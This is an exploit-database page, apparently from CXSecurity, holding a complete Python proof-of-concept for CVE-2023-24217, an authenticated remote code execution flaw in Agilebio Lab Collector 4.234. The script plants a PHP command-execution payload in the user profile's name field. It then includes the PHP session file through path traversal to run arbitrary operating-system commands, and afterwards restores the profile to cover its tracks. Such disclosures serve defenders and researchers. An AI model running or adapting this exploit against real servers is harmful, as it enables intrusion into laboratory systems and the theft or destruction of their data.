---
title: Agilebio Lab Collector 4.234 Remote Code Execution
url: https://cxsecurity.com/issue/WLB-2023030014
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2023-03-07
fetch_date: 2025-10-04T08:47:44.898423
---

# Agilebio Lab Collector 4.234 Remote Code Execution

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Agilebio Lab Collector 4.234 Remote Code Execution** **2023.03.06**  Credit:  **[Anthony Cole](https://cxsecurity.com/author/Anthony%2BCole/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2023-24217](https://cxsecurity.com/cveshow/CVE-2023-24217/ "Click to see CVE-2023-24217")**  CWE: **N/A** | |

# Exploit Title: Agilebio Lab Collector Electronic Lab Notebook Remote Code Execution
# Date: 2023-02-28
# Exploit Author: Anthony Cole
# Vendor Homepage: https://labcollector.com/labcollector-lims/add-ons/eln-electronic-lab-notebook/
# Version: v4.234
# Contact: http://twitter.com/acole76
# Website: http://twitter.com/acole76
# Tested on: PHP/MYSQL
# CVE: CVE-2023-24217
# Category: webapps
#
# Lab Collector is a software written in PHP by Agilebio. Version v4.234 allows an authenticated user to execute os commands on the underlying operating system.
#
from argparse import ArgumentParser
from requests import Session
from random import choice
from string import ascii\_lowercase, ascii\_uppercase, digits
import re
from base64 import b64encode
from urllib.parse import quote\_plus
sess:Session = Session()
cookies = {}
headers = {}
state = {}
def random\_string(length:int) -> str:
return "".join(choice(ascii\_lowercase+ascii\_uppercase+digits) for i in range(length))
def login(base\_url:str, username:str, password:str) -> bool:
data = {"login": username, "pass": password, "Submit":"", "action":"login"}
headers["Referer"] = f"{base\_url}/login.php?%2Findex.php%3Fcontroller%3Duser\_profile"
res = sess.post(f"{base\_url}/login.php", data=data, headers=headers)
if("My profile" in res.text):
return res.text
else:
return None
def logout(base\_url:str) -> bool:
headers["Referer"] = f"{base\_url}//index.php?controller=user\_profile&subcontroller=update"
sess.get(f"{base\_url}/login.php?%2Findex.php%3Fcontroller%3Duser\_profile%26subcontroller%3Dupdate",headers=headers)
def extract\_field\_value(contents, name):
value = re.findall(f'name="{name}" value="(.\*)"', contents)
if(len(value)):
return value[0]
else:
return ""
def get\_profile(html:str):
return {
"contact\_name": extract\_field\_value(html, "contact\_name"),
"contact\_lab": extract\_field\_value(html, "contact\_lab"),
"contact\_address": extract\_field\_value(html, "contact\_address"),
"contact\_city": extract\_field\_value(html, "contact\_city"),
"contact\_zip": extract\_field\_value(html, "contact\_zip"),
"contact\_country": extract\_field\_value(html, "contact\_country"),
"contact\_tel": extract\_field\_value(html, "contact\_tel"),
"contact\_email": extract\_field\_value(html, "contact\_email")
}
def update\_profile(base\_url:str, wrapper:str, param:str, data:dict) -> bool:
headers["Referer"] = f"{base\_url}/index.php?controller=user\_profile&subcontroller=update"
res = sess.post(f"{base\_url}/index.php?controller=user\_profile&subcontroller=update", data=data, headers=headers)
return True
def execute\_command(base\_url:str, wrapper:str, param:str, session\_path:str, cmd:str):
session\_file = sess.cookies.get("PHPSESSID")
headers["Referer"] = f"{base\_url}/login.php?%2F"
page = f"../../../../../..{session\_path}/sess\_{session\_file}"
res = sess.get(f"{base\_url}/extra\_modules/eln/index.php?page={page}&action=edit&id=1&{param}={quote\_plus(cmd)}", headers=headers)
return parse\_output(res.text, wrapper)
def exploit(args) -> None:
wrapper = random\_string(5)
param = random\_string(3)
html = login(args.url, args.login\_username, args.login\_password)
if(html == None):
print("unable to login")
return False
clean = get\_profile(html)
data = get\_profile(html)
tag = b64encode(wrapper.encode()).decode()
payload = f"<?php $t=base64\_decode('{tag}');echo $t;passthru($\_GET['{param}']);echo $t; ?>"
data["contact\_name"] = payload #inject payload in name field
if(update\_profile(args.url, wrapper, param, data)):
login(args.url, args.login\_username, args.login\_password) # reload the session w/ our payload
print(execute\_command(args.url, wrapper, param, args.sessions, args.cmd))
update\_profile(args.url, wrapper, param, clean) # revert the profile
logout(args.url)
def parse\_output(contents, wrapper) -> None:
matches = re.findall(f"{wrapper}(.\*)\s{wrapper}", contents, re.MULTILINE | re.DOTALL)
if(len(matches)):
return matches[0]
return None
def main() -> None:
parser:ArgumentParser = ArgumentParser(description="CVE-2023-24217")
parser.add\_argument("--url", "-u", required=True, help="Base URL for the affected application.")
parser.add\_argument("--login-username", "-lu", required=True, help="Username.")
parser.add\_argument("--login-password", "-lp", required=True, help="Password.")
parser.add\_argument("--cmd", "-c", required=True, help="OS command to execute.")
parser.add\_argument("--sessions", "-s", required=False, default="/var/lib/php/session/", help="The location where php stores session files.")
args = parser.parse\_args()
if(args.url.endswith("/")):
args.url = args.url[:-1]
if(args.sessions.endswith("/")):
args.sessions = args.sessions[:-1]
exploit(args)
pass
if(\_\_name\_\_ == "\_\_main\_\_"):
main()

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2023030014)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top